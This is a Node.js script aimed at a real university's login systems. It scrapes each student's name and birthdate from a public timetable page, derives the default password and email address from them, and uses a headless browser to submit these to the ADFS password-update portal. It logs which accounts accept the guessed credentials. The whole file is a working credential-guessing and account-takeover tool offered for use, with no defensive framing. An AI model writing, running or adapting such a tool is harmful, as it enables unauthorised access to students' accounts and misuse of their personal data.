const fs = require("fs");
const axios = require("axios");
const puppeteer = require("puppeteer");

const allSVB16CN = fs
  .readFileSync("allsv.txt", "utf-8")
  .split("\n")
  .filter((e) => e.startsWith("B14DCCN"));

const ABC = [];
const CDE = [];

(async function () {
  const browser = await puppeteer.launch({ headless: true });
  let page;
  console.log("tasks length", allSVB16CN.length);
  for (const index in allSVB16CN) {
    const mssv = allSVB16CN[index];
    console.log("====================", `${index}/${allSVB16CN.length}`);
    try {
      page = await browser.newPage();
      await page.goto("https://reset.ptit.edu.vn/adfs/portal/updatepassword/");
      console.log("scan", mssv);
      const { data } = await axios.get(
        "http://qldt.ptit.edu.vn/Default.aspx?page=thoikhoabieu&id=" + mssv
      );
      const r = GetTagByIdUsingRegex(
        "span",
        "ctl00_ContentPlaceHolder1_ctl00_lblContentTenSV",
        data
      )[0];

      const result = r
        .replace(
          '<span id="ctl00_ContentPlaceHolder1_ctl00_lblContentTenSV" class="Label"><b><font color="Teal">',
          ""
        )
        .replace("</font></b></span>", "");

      const name = removeAccents(result.split("-")[0].trim());
      const ngaysinh = result
        .split("-")[1]
        .trim()
        .replace("Ngày sinh:", "")
        .split("/");

      const splitName = name.split(" ");

      if (splitName.length !== 3) {
        continue;
      }

      const pass = splitName[2] + ngaysinh[1] + ngaysinh[0] + ngaysinh[2];

      const email =
        splitName[2].toLowerCase() +
        splitName[0].toLowerCase()[0] +
        splitName[1].toLowerCase()[0] +
        "." +
        mssv.toUpperCase().replace("DC", "") +
        "@stu.ptit.edu.vn";

      console.log(`${result}-${email}-${pass}`);

      await page.evaluate(
        (val) => {
          debugger;
          document.getElementById("userNameInput").value = val.email;
          document.getElementById("oldPasswordInput").value = val.pass;
          document.getElementById("newPasswordInput").value = val.pass;
          document.getElementById("confirmNewPasswordInput").value = val.pass;
          document.getElementById("submitButton").click();
        },
        { email, pass }
      );

      await page.waitForNavigation({ waitUntil: "networkidle0" });

      const error = await page.evaluate(() => {
        const a = document.getElementById("errorText");
        if (a) {
          return a.innerText.trim();
        }
        const b = document.getElementById("errorMessage");
        if (b) {
          return b.innerText.trim();
        }
      });

      if (error === "The user ID or password is incorrect.") {
        ABC.push({ email, pass });
      }

      if (
        error ===
        "An error occurred. Contact your administrator for more information."
      ) {
        continue;
      } else if (!error) {
        CDE.push({ email, pass });
      }

      fs.writeFileSync("TK.txt", JSON.stringify(ABC));

      fs.writeFileSync("TEST_PASS.txt", JSON.stringify(CDE));
    } catch (ex) {
      continue;
    } finally {
      page.close();
    }
  }
})();

function removeAccents(str) {
  var AccentsMap = [
    "aàảãáạăằẳẵắặâầẩẫấậ",
    "AÀẢÃÁẠĂẰẲẴẮẶÂẦẨẪẤẬ",
    "dđ",
    "DĐ",
    "eèẻẽéẹêềểễếệ",
    "EÈẺẼÉẸÊỀỂỄẾỆ",
    "iìỉĩíị",
    "IÌỈĨÍỊ",
    "oòỏõóọôồổỗốộơờởỡớợ",
    "OÒỎÕÓỌÔỒỔỖỐỘƠỜỞỠỚỢ",
    "uùủũúụưừửữứự",
    "UÙỦŨÚỤƯỪỬỮỨỰ",
    "yỳỷỹýỵ",
    "YỲỶỸÝỴ",
  ];
  for (var i = 0; i < AccentsMap.length; i++) {
    var re = new RegExp("[" + AccentsMap[i].substr(1) + "]", "g");
    var char = AccentsMap[i][0];
    str = str.replace(re, char);
  }
  return str;
}

function GetTagByIdUsingRegex(tag, id, html) {
  return new RegExp(
    "<" +
      tag +
      "[^>]*id[\\s]?=[\\s]?['\"]" +
      id +
      "['\"][\\s\\S]*?</" +
      tag +
      ">"
  ).exec(html);
}
